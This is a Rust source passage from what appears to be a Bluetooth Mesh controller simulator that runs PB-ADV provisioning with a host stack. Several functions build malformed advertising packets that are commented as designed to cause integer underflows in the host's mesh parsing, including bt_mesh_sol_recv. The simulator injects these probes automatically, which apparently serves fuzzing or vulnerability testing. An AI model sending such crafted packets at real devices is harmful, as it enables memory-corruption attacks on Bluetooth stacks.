        let (Some(session_key), Some(session_nonce)) = (state.session_key, state.session_nonce) else {
            return None;
        };

        let mut provisioning_data = [0u8; 25];
        let net_key = Self::deterministic_blob(link_id, 0xA6, 16);
        provisioning_data[..16].copy_from_slice(&net_key);
        provisioning_data[16..18].copy_from_slice(&0x0000u16.to_be_bytes()); // key index
        provisioning_data[18] = 0x00; // flags
        provisioning_data[19..23].copy_from_slice(&0x00000000u32.to_be_bytes()); // iv index
        provisioning_data[23..25].copy_from_slice(&0x0001u16.to_be_bytes()); // unicast addr

        let (enc, mic) = Self::aes_ccm_encrypt_no_aad_mic8(&session_key, &session_nonce, &provisioning_data);
        let mut msg = vec![Self::PROV_OPCODE_DATA];
        msg.extend_from_slice(&enc);
        msg.extend_from_slice(&mic);
        Some(msg)
    }

    fn verify_peer_confirmation(&self) -> bool {
        let Some(state) = self.prov_crypto.as_ref() else {
            return false;
        };
        let (Some(key), Some(peer_confirmation), Some(peer_random)) = (state.confirmation_key, state.peer_confirmation, state.peer_random) else {
            return false;
        };
        let mut input = Vec::with_capacity(32);
        input.extend_from_slice(&peer_random);
        input.extend_from_slice(&state.auth_value);
        Self::aes_cmac(&key, &input) == peer_confirmation
    }

    fn process_data_from_peer(&mut self, payload: &[u8]) -> bool {
        if payload.len() != 34 {
            return false;
        }
        if !self.ensure_session_material() {
            return false;
        }

        let Some(state) = self.prov_crypto.as_ref() else {
            return false;
        };
        let (Some(session_key), Some(session_nonce)) = (state.session_key, state.session_nonce) else {
            return false;
        };

        let ciphertext = &payload[1..26];
        let mut mic = [0u8; 8];
        mic.copy_from_slice(&payload[26..34]);
        Self::aes_ccm_decrypt_no_aad_mic8(&session_key, &session_nonce, ciphertext, &mic).is_some()
    }

    fn kickoff_provisioning_as_provisioner(&mut self, link_id: u32) {
        if self.provisioning_role != ProvisioningRole::SimulatorProvisioner {
            return;
        }
        if self.provisioning_stage != ProvisioningStage::LinkOpen && self.provisioning_stage != ProvisioningStage::Idle {
            return;
        }
        self.maybe_init_provisioning_crypto(ProvisioningRole::SimulatorProvisioner, link_id);

        let invite = Self::build_invite_message();
        if let Some(state) = self.prov_crypto.as_mut() {
            state.invite_pdu = Some(invite.clone());
        }
        self.queue_provisioning_message(link_id, &invite);
        self.provisioning_stage = ProvisioningStage::Invite;
        debug!("[Mesh] provisioning kickoff as simulator-provisioner on link=0x{link_id:08x}");
    }

    fn handle_provisioning_message_as_provisionee(&mut self, link_id: u32, payload: &[u8]) {
        let opcode = payload[0];
        match opcode {
            Self::PROV_OPCODE_INVITE => {
                self.provisioning_stage = ProvisioningStage::Invite;
                self.maybe_init_provisioning_crypto(ProvisioningRole::SimulatorProvisionee, link_id);
                if let Some(state) = self.prov_crypto.as_mut() {
                    state.invite_pdu = Some(payload.to_vec());
                }
                let caps = Self::build_capabilities_message();
                if let Some(state) = self.prov_crypto.as_mut() {
                    state.capabilities_pdu = Some(caps.clone());
                }
                self.queue_provisioning_message(link_id, &caps);
            }
            Self::PROV_OPCODE_START => {
                self.provisioning_stage = ProvisioningStage::Start;
                if let Some(state) = self.prov_crypto.as_mut() {
                    state.start_pdu = Some(payload.to_vec());
                }
            }
            Self::PROV_OPCODE_PUBLIC_KEY => {
                self.provisioning_stage = ProvisioningStage::PublicKey;
                if payload.len() >= 65 {
                    let mut wire = [0u8; 64];
                    wire.copy_from_slice(&payload[1..65]);
                    if let Some(state) = self.prov_crypto.as_mut() {
                        state.peer_public_key = Some(wire);
                        Self::try_derive_confirmation_material(state);
                    }
                    if let Some(reply) = self.build_public_key_message() {
                        self.queue_provisioning_message(link_id, &reply);
                    }
                }
            }
            Self::PROV_OPCODE_INPUT_COMPLETE => {}
            Self::PROV_OPCODE_CONFIRMATION => {
                self.provisioning_stage = ProvisioningStage::Confirmation;
                if payload.len() >= 17 {
                    let mut peer_confirmation = [0u8; 16];
                    peer_confirmation.copy_from_slice(&payload[1..17]);
                    if let Some(state) = self.prov_crypto.as_mut() {
                        state.peer_confirmation = Some(peer_confirmation);
                    }
                    if let Some(reply) = self.build_confirmation_message() {
                        self.queue_provisioning_message(link_id, &reply);
                    }
                }
            }
            Self::PROV_OPCODE_RANDOM => {
                self.provisioning_stage = ProvisioningStage::Random;
                if payload.len() >= 17 {
                    let mut peer_random = [0u8; 16];
                    peer_random.copy_from_slice(&payload[1..17]);
                    if let Some(state) = self.prov_crypto.as_mut() {
                        state.peer_random = Some(peer_random);
                    }
                    if !self.verify_peer_confirmation() {
                        self.queue_provisioning_message(link_id, &Self::build_failed_message(0x07));
                        return;
                    }
                    if let Some(reply) = self.build_random_message() {
                        self.queue_provisioning_message(link_id, &reply);
                    }
                }
            }
            Self::PROV_OPCODE_DATA => {
                self.provisioning_stage = ProvisioningStage::Data;
                if self.process_data_from_peer(payload) {
                    self.queue_provisioning_message(link_id, &Self::build_complete_message());
                    self.provisioning_stage = ProvisioningStage::Complete;
                    self.maybe_enqueue_underflow_probes();
                    self.maybe_enqueue_solicitation_underflow_probes();
                } else {
                    self.queue_provisioning_message(link_id, &Self::build_failed_message(0x01));
                }
            }
            Self::PROV_OPCODE_FAILED => {
                self.provisioning_stage = ProvisioningStage::Failed;
            }
            Self::PROV_OPCODE_COMPLETE => {
                self.provisioning_stage = ProvisioningStage::Complete;
            }
            _ => {
                warn!("[Mesh] simulator-provisionee received unknown provisioning opcode=0x{opcode:02x}");
                self.queue_provisioning_message(link_id, &Self::build_failed_message(0x01));
            }
        }
    }

    fn handle_provisioning_message_as_provisioner(&mut self, link_id: u32, payload: &[u8]) {
        let opcode = payload[0];
        match opcode {
            Self::PROV_OPCODE_CAPABILITIES => {
                self.provisioning_stage = ProvisioningStage::Start;
                self.maybe_init_provisioning_crypto(ProvisioningRole::SimulatorProvisioner, link_id);
                if let Some(state) = self.prov_crypto.as_mut() {
                    state.capabilities_pdu = Some(payload.to_vec());
                }
                let start = Self::build_start_message();
                if let Some(state) = self.prov_crypto.as_mut() {
                    state.start_pdu = Some(start.clone());
                }
                self.queue_provisioning_message(link_id, &start);
                if let Some(pub_key) = self.build_public_key_message() {
                    self.queue_provisioning_message(link_id, &pub_key);
                }
            }
            Self::PROV_OPCODE_PUBLIC_KEY => {
                self.provisioning_stage = ProvisioningStage::PublicKey;
                if payload.len() >= 65 {
                    let mut wire = [0u8; 64];
                    wire.copy_from_slice(&payload[1..65]);
                    if let Some(state) = self.prov_crypto.as_mut() {
                        state.peer_public_key = Some(wire);
                        Self::try_derive_confirmation_material(state);
                    }
                    if let Some(reply) = self.build_confirmation_message() {
                        self.queue_provisioning_message(link_id, &reply);
                    }
                }
            }
            Self::PROV_OPCODE_CONFIRMATION => {
                self.provisioning_stage = ProvisioningStage::Confirmation;
                if payload.len() >= 17 {
                    let mut peer_confirmation = [0u8; 16];
                    peer_confirmation.copy_from_slice(&payload[1..17]);
                    if let Some(state) = self.prov_crypto.as_mut() {
                        state.peer_confirmation = Some(peer_confirmation);
                    }
                }
            }
            Self::PROV_OPCODE_RANDOM => {
                self.provisioning_stage = ProvisioningStage::Random;
                if payload.len() >= 17 {
                    let mut peer_random = [0u8; 16];
                    peer_random.copy_from_slice(&payload[1..17]);
                    if let Some(state) = self.prov_crypto.as_mut() {
                        state.peer_random = Some(peer_random);
                    }
                    if !self.verify_peer_confirmation() {
                        self.queue_provisioning_message(link_id, &Self::build_failed_message(0x07));
                        return;
                    }
                    if let Some(random_msg) = self.build_random_message() {
                        self.queue_provisioning_message(link_id, &random_msg);
                    }
                    if let Some(data_msg) = self.build_data_message(link_id) {
                        self.queue_provisioning_message(link_id, &data_msg);
                        self.provisioning_stage = ProvisioningStage::Data;
                    }
                }
            }
            Self::PROV_OPCODE_COMPLETE => {
                self.provisioning_stage = ProvisioningStage::Complete;
                self.maybe_enqueue_underflow_probes();
                self.maybe_enqueue_solicitation_underflow_probes();
            }
            Self::PROV_OPCODE_FAILED => {
                self.provisioning_stage = ProvisioningStage::Failed;
            }
            _ => {
                debug!("[Mesh] simulator-provisioner ignore provisioning opcode=0x{opcode:02x}");
            }
        }
    }

    fn handle_complete_rx_transaction(&mut self, transaction: RxProvisioningTransaction) {
        if transaction.payload.is_empty() {
            self.enqueue_pbadv_transaction_ack(transaction.link_id, transaction.transaction_number);
            return;
        }

        let mut payload = transaction.payload;
        if payload.len() > transaction.total_length {
            payload.truncate(transaction.total_length);
        }

        let fcs_ok = Self::mesh_fcs_valid(&payload, transaction.fcs);
        if !fcs_ok {
            warn!(
                "[Mesh] provisioning transaction FCS mismatch link=0x{:08x} txn=0x{:02x} expected_fcs=0x{:02x} len={} segs={}",
                transaction.link_id,
                transaction.transaction_number,
                transaction.fcs,
                payload.len(),
                transaction.expected_segments
            );
        }

        let opcode = payload[0];
        let opcode_name = Self::provisioning_opcode_name(opcode);
        info!(
            "[Mesh] complete provisioning transaction: link=0x{:08x} txn=0x{:02x} opcode={}({}) payload_len={} fcs_ok={} role={:?} stage={:?}",
            transaction.link_id,
            transaction.transaction_number,
            opcode_name,
            opcode,
            payload.len(),
            fcs_ok,
            self.provisioning_role,
            self.provisioning_stage
        );

        self.enqueue_pbadv_transaction_ack(transaction.link_id, transaction.transaction_number);

        if self.provisioning_role == ProvisioningRole::Unknown {
            self.provisioning_role = Self::infer_role_from_opcode(opcode);
            debug!("[Mesh] inferred provisioning role: {:?}", self.provisioning_role);
        }

        match self.provisioning_role {
            ProvisioningRole::SimulatorProvisioner => self.handle_provisioning_message_as_provisioner(transaction.link_id, &payload),
            ProvisioningRole::SimulatorProvisionee => self.handle_provisioning_message_as_provisionee(transaction.link_id, &payload),
            ProvisioningRole::Unknown => {}
        }
    }

    fn on_pbadv_trans_start(&mut self, link_id: u32, transaction_number: u8, start: ProvisioningTransStart) {
        let mut total_length = usize::from(start.total_length);
        let expected_segments = usize::from(start.seg_num).saturating_add(1).clamp(1, Self::PB_ADV_MAX_SEGMENTS);
        if total_length == 0 {
            total_length = start.data.len();
        }

        let max_len = Self::PB_ADV_SEGMENT_DATA_MAX * Self::PB_ADV_MAX_SEGMENTS;
        total_length = total_length.clamp(1, max_len);

        let mut payload = start.data;
        if payload.len() > total_length {
            payload.truncate(total_length);
        }

        self.active_pbadv_link_id = Some(link_id);
        self.rx_transaction = Some(RxProvisioningTransaction {
            link_id,
            transaction_number,
            total_length,
            fcs: start.fcs,
            expected_segments,
            next_segment_index: 1,
            payload,
        });

        let mut should_finish = false;
        if let Some(rx) = &self.rx_transaction {
            should_finish = expected_segments == 1 || rx.payload.len() >= rx.total_length;
        }
        if should_finish {
            self.finish_rx_transaction();
        }
    }

    fn on_pbadv_trans_cont(&mut self, link_id: u32, transaction_number: u8, cont: ProvisioningTransCont) {
        let mut should_finish = false;

        let Some(rx) = self.rx_transaction.as_mut() else {
            return;
        };

        if rx.link_id != link_id || rx.transaction_number != transaction_number {
            debug!(
                "[Mesh] ignore trans-cont on unmatched transaction link=0x{link_id:08x} txn=0x{transaction_number:02x} expected_link=0x{:08x} expected_txn=0x{:02x}",
                rx.link_id, rx.transaction_number
            );
            return;
        }

        if cont.seg_num < rx.next_segment_index {
            debug!(
                "[Mesh] ignore duplicate trans-cont seg={} expected_seg={} link=0x{link_id:08x} txn=0x{transaction_number:02x}",
                cont.seg_num, rx.next_segment_index
            );
        } else if cont.seg_num > rx.next_segment_index {
            warn!(
                "[Mesh] out-of-order trans-cont seg={} expected_seg={} link=0x{link_id:08x} txn=0x{transaction_number:02x}",
                cont.seg_num, rx.next_segment_index
            );
        } else {
            let remain = rx.total_length.saturating_sub(rx.payload.len());
            if remain > 0 {
                let append_len = remain.min(cont.data.len());
                rx.payload.extend_from_slice(&cont.data[..append_len]);
            }
            rx.next_segment_index = rx.next_segment_index.saturating_add(1);
        }

        if rx.payload.len() >= rx.total_length || usize::from(rx.next_segment_index) >= rx.expected_segments {
            should_finish = true;
        }

        if should_finish {
            self.finish_rx_transaction();
        }
    }

    fn finish_rx_transaction(&mut self) {
        let Some(transaction) = self.rx_transaction.take() else {
            return;
        };
        self.handle_complete_rx_transaction(transaction);
    }

    fn handle_pbadv_packet(&mut self, pdu: PbAdvPdu) {
        let link_id = pdu.link_id;
        let transaction_number = pdu.transaction_number;

        match pdu.generic_prov_pdu {
            ProvisioningPdu::BearerControl(ProvisioningBearerControl::LinkOpen(device_uuid)) => {
                debug!(
                    "[Mesh] rx bearer ctrl LINK_OPEN link=0x{link_id:08x} txn=0x{transaction_number:02x} uuid={}",
                    hex::encode_upper(&device_uuid)
                );
                self.active_pbadv_link_id = Some(link_id);
                self.rx_transaction = None;
                self.pending_tx_ack = None;
                self.provisioning_role = ProvisioningRole::SimulatorProvisionee;
                self.provisioning_stage = ProvisioningStage::LinkOpen;
                self.init_provisioning_crypto(ProvisioningRole::SimulatorProvisionee, link_id);
                self.link_open_sent = true;
                self.enqueue_pbadv_control_with_txn(link_id, transaction_number, ProvisioningBearerControl::LinkAck);
                self.maybe_enqueue_underflow_probes();
                self.maybe_enqueue_solicitation_underflow_probes();
            }
            ProvisioningPdu::BearerControl(ProvisioningBearerControl::LinkAck) => {
                debug!("[Mesh] rx bearer ctrl LINK_ACK link=0x{link_id:08x} txn=0x{transaction_number:02x}");
                self.active_pbadv_link_id = Some(link_id);
                if self.provisioning_role == ProvisioningRole::Unknown {
                    self.provisioning_role = ProvisioningRole::SimulatorProvisioner;
                }
                if self.provisioning_stage == ProvisioningStage::Idle {
                    self.provisioning_stage = ProvisioningStage::LinkOpen;
                }
                self.maybe_init_provisioning_crypto(ProvisioningRole::SimulatorProvisioner, link_id);
                self.kickoff_provisioning_as_provisioner(link_id);
                self.maybe_enqueue_underflow_probes();
                self.maybe_enqueue_solicitation_underflow_probes();
            }
            ProvisioningPdu::BearerControl(ProvisioningBearerControl::LinkClose(reason)) => {
                debug!("[Mesh] rx bearer ctrl LINK_CLOSE link=0x{link_id:08x} txn=0x{transaction_number:02x} reason=0x{reason:02x}");
                self.link_open_sent = false;
                self.underflow_probe_sent = false;
                self.solicitation_probe_sent = false;
                self.reset_pbadv_session_state();
            }
            ProvisioningPdu::TransStart(start) => {
                debug!(
                    "[Mesh] rx trans-start link=0x{link_id:08x} txn=0x{transaction_number:02x} seg_n={} total_len={} data_len={} fcs=0x{:02x}",
                    start.seg_num,
                    start.total_length,
                    start.data.len(),
                    start.fcs
                );
                self.on_pbadv_trans_start(link_id, transaction_number, start);
            }
            ProvisioningPdu::TransCont(cont) => {
                debug!(
                    "[Mesh] rx trans-cont link=0x{link_id:08x} txn=0x{transaction_number:02x} seg={} data_len={}",
                    cont.seg_num,
                    cont.data.len()
                );
                self.on_pbadv_trans_cont(link_id, transaction_number, cont);
            }
            ProvisioningPdu::TransAck => {
                self.on_pbadv_trans_ack(link_id, transaction_number);
            }
        }
    }

    fn build_underflow_network_payload(payload_len: usize, ctl: bool, seed: u8) -> Vec<u8> {
        let payload_len = payload_len.max(9);
        let mut payload = vec![0u8; payload_len];
        payload[0] = seed & 0x7f; // IVI|NID
        payload[1] = if ctl { 0x80 | (seed & 0x0f) } else { seed & 0x0f }; // CTL|TTL
        payload[2] = seed;
        payload[3] = seed.wrapping_mul(3);
        payload[4] = seed.wrapping_mul(7);
        payload[5] = 0x12;
        payload[6] = 0x34;
        payload[7] = 0x00;
        payload[8] = seed.wrapping_add(1);
        for idx in 9..payload_len {
            payload[idx] = seed.wrapping_add((idx as u8).wrapping_mul(11));
        }
        payload
    }

    fn enqueue_solicitation_underflow_packet(&mut self, next_elem_len: u8, seed: u8, uuid_ad_type: u8, next_ad_type: u8) {
        // Layout intentionally matches bt_mesh_sol_recv parser:
        // [UUID16 list AD type 0x02/0x03 including 0x1859][next AD len tiny 0/1/2][type][u16][tail...].
        // The tiny "next AD len" drives (len - 3) underflow inside bt_mesh_sol_recv.
        let mut packet = Vec::with_capacity(48);
        packet.push(0x03);
        packet.push(uuid_ad_type);
        packet.extend_from_slice(&0x1859u16.to_le_bytes());
        packet.push(next_elem_len);
        packet.push(next_ad_type);
        // Bytes consumed by pull_le16 right after tiny length/type.
        packet.push(seed);
        packet.push(seed ^ 0xA5);

        // Keep enough trailing bytes so bt_mesh_sol_recv's pre-checks (`buf->len > 23`, `> 21`) pass.
        let trailing_len = 24 + usize::from(seed & 0x07);
        for idx in 0..trailing_len {
            packet.push(seed.wrapping_add((idx as u8).wrapping_mul(13)));
        }
        self.packet_queue.push(packet);
    }

    fn maybe_enqueue_solicitation_underflow_probes(&mut self) {
        if self.solicitation_probe_sent {
            return;
        }

        const PROBES: &[(u8, u8, u8, u8)] = &[
            // (next AD len, seed, UUID-list AD type, next AD type)
            (0, 0x11, 0x03, 0x2B),
            (1, 0x22, 0x02, 0x2B),
            (2, 0x33, 0x03, 0x16),
            (0, 0x44, 0x03, 0x16),
            (1, 0x55, 0x02, 0x2B),
        ];
        for (next_elem_len, seed, uuid_ad_type, next_ad_type) in PROBES {
            self.enqueue_solicitation_underflow_packet(*next_elem_len, *seed, *uuid_ad_type, *next_ad_type);
        }
        self.solicitation_probe_sent = true;
        debug!("[Mesh] queued {} solicitation-underflow probes", PROBES.len());
    }

    fn maybe_enqueue_underflow_probes(&mut self) {
        if self.underflow_probe_sent {
            return;
        }

        // Keep probes short so len math `len - 7 - net_mic_len` underflows in host network decode path.
        const PROBES: &[(usize, bool, u8)] = &[(9, false, 0x11), (10, false, 0x22), (11, true, 0x33), (12, true, 0x44), (13, true, 0x55)];
        for (payload_len, ctl, seed) in PROBES {
            let payload = Self::build_underflow_network_payload(*payload_len, *ctl, *seed);
            self.enqueue_ad_packet(Self::AD_TYPE_MESH_MESSAGE, &payload);
        }
        self.underflow_probe_sent = true;
        debug!("[Mesh] queued {} mesh underflow probes", PROBES.len());
    }

    pub fn on_advertise_packet(&mut self, ad_type: u8, packet: &[u8]) -> Result<(), ControllerError> {
        match ad_type {
            // PB-ADV
            Self::AD_TYPE_MESH_PBADV => {
                if let Ok(pdu) = PbAdvPdu::from_bytes(packet) {
                    info!("[Mesh] receiving mesh provisioning pdu from host: {:?}", pdu);
                    self.handle_pbadv_packet(pdu);
                }
            }
            // Mesh Message
            Self::AD_TYPE_MESH_MESSAGE => {
                if let Ok(pdu) = NetworkPdu::from_bytes(packet) {
                    info!("[Mesh] receiving mesh networking pdu from host: {:?}", pdu);
                }
            }
            // Mesh Beacon
            Self::AD_TYPE_MESH_BEACON => {
                if let Ok(pdu) = MeshBeacon::from_bytes(packet) {
                    info!("[Mesh] receiving mesh beacon pdu from host: {:?}", pdu);
                    if let MeshBeacon::Unprovisioned(unprov) = &pdu {
                        if !self.link_open_sent {
                            // Open provisioning link once for the current cycle.
                            self.active_pbadv_link_id = Some(self.link_id);
                            self.rx_transaction = None;
                            self.pending_tx_ack = None;
                            self.provisioning_role = ProvisioningRole::SimulatorProvisioner;
                            self.provisioning_stage = ProvisioningStage::LinkOpen;
                            self.init_provisioning_crypto(ProvisioningRole::SimulatorProvisioner, self.link_id);

                            let txn = self.next_transaction_number();
                            self.enqueue_pbadv_control_with_txn(self.link_id, txn, ProvisioningBearerControl::LinkOpen(unprov.device_uuid.to_vec()));
                            self.link_open_sent = true;
                        }
                        self.maybe_enqueue_underflow_probes();
                        self.maybe_enqueue_solicitation_underflow_probes();
                    }
                }
            }
            _ => {}
        };
        Ok(())
    }

    pub fn send_legacy_scan_report(&mut self) -> Result<(), ControllerError> {
        info!("[Mesh] Legacy scan enabled action");
        for packet in &self.packet_queue {
            let reports = [AdvertisingReport {
                event_type: 0x03,
                address_type: self.addr_type.clone(),
                address: self.addr.clone(),
                data_length: packet.len() as u8,
                data: packet.to_vec(),
                rssi: 0,
            }]
            .to_vec();
            info!("[Mesh] send legacy scan reports: reports={:?}", reports);
            self.simulator
                .send_hci_packet(ControllerToHostPacket::Event(LeAdvertisingReportEvent::new(reports)));
        }
        self.packet_queue.clear();
        Ok(())
    }

    pub fn send_extended_scan_report(&mut self) -> Result<(), ControllerError> {
        info!("[Mesh] Extended scan enabled action");
        for packet in &self.packet_queue {
            let mut buf = Vec::new();
            buf.extend_from_slice(&0b0010000u16.to_le_bytes()); // Event_Type: adv nonconn ind
            buf.push(self.addr_type.to_bytes().unwrap()[0]); // Address_Type
            buf.extend_from_slice(&self.addr.to_bytes().unwrap());
            buf.push(0x01); // Primary PHY
            buf.push(0x02); // Secondary PHY
            buf.push(0x00); // SID
            buf.push(0x00); // Tx_Power
            buf.push(0x00); // RSSI
            buf.extend_from_slice(&0x00u16.to_le_bytes()); // Periodic Interval
            buf.push(0x00); // Direct Address Type
            buf.extend_from_slice(&[0; 6]); // Direct Address
            buf.push(packet.len() as u8); // Data_Length
            buf.extend_from_slice(&packet);

            info!("[Mesh] send legacy scan reports: reports={:?}", buf);
            self.simulator
                .send_hci_packet(ControllerToHostPacket::Event(LeExtendedAdvertisingReportEvent::new(buf)));

            // Compatibility fallback for stacks that keep mesh scan callback wired to legacy
            // advertising report path even when issuing extended scan commands.
            let reports = vec![AdvertisingReport {
                event_type: 0x03,
                address_type: self.addr_type.clone(),
                address: self.addr.clone(),
                data_length: packet.len() as u8,
                data: packet.to_vec(),
                rssi: 0,
            }];
            self.simulator
                .send_hci_packet(ControllerToHostPacket::Event(LeAdvertisingReportEvent::new(reports)));
        }
        self.packet_queue.clear();
        Ok(())
    }

    pub fn on_legacy_advertising(&mut self, payload: &[u8], scan_enabled: bool) -> Result<(), ControllerError> {
        info!("[Mesh] Legacy advertising action");
        info!("  data={}", hex::encode_upper(&payload));

        let mut offset = 0usize;
        while offset < payload.len() {
            let ad_len = payload[offset] as usize;
            offset += 1;
            if ad_len == 0 {
                break;
            }
            let ad_end = offset.saturating_add(ad_len);
            if ad_end > payload.len() {
                break;
            }
            let ad_type = payload[offset];
            let ad_data = &payload[(offset + 1)..ad_end];
            offset = ad_end;
            info!("  length={},type=0x{:02x},data={}", ad_len, ad_type, hex::encode_upper(&ad_data));

            self.on_advertise_packet(ad_type, &ad_data)?;
        }
        if scan_enabled {
            self.send_legacy_scan_report()?;
        }
        Ok(())
    }

    pub fn on_extended_advertising(&mut self, payload: &[u8], scan_enabled: bool) -> Result<(), ControllerError> {
        info!("[Mesh] Extended advertising action");
        info!("  data={}", hex::encode_upper(&payload));

        let mut offset = 0usize;
        while offset < payload.len() {
            let ad_len = payload[offset] as usize;
            offset += 1;
            if ad_len == 0 {
                break;
            }
            let ad_end = offset.saturating_add(ad_len);
            if ad_end > payload.len() {
                break;
            }
            let ad_type = payload[offset];
            let ad_data = &payload[(offset + 1)..ad_end];
            offset = ad_end;
            info!("  length={},type=0x{:02x},data={}", ad_len, ad_type, hex::encode_upper(&ad_data));

            self.on_advertise_packet(ad_type, &ad_data)?;
        }
        if scan_enabled {
            self.send_extended_scan_report()?;
        }
        Ok(())
    }
}
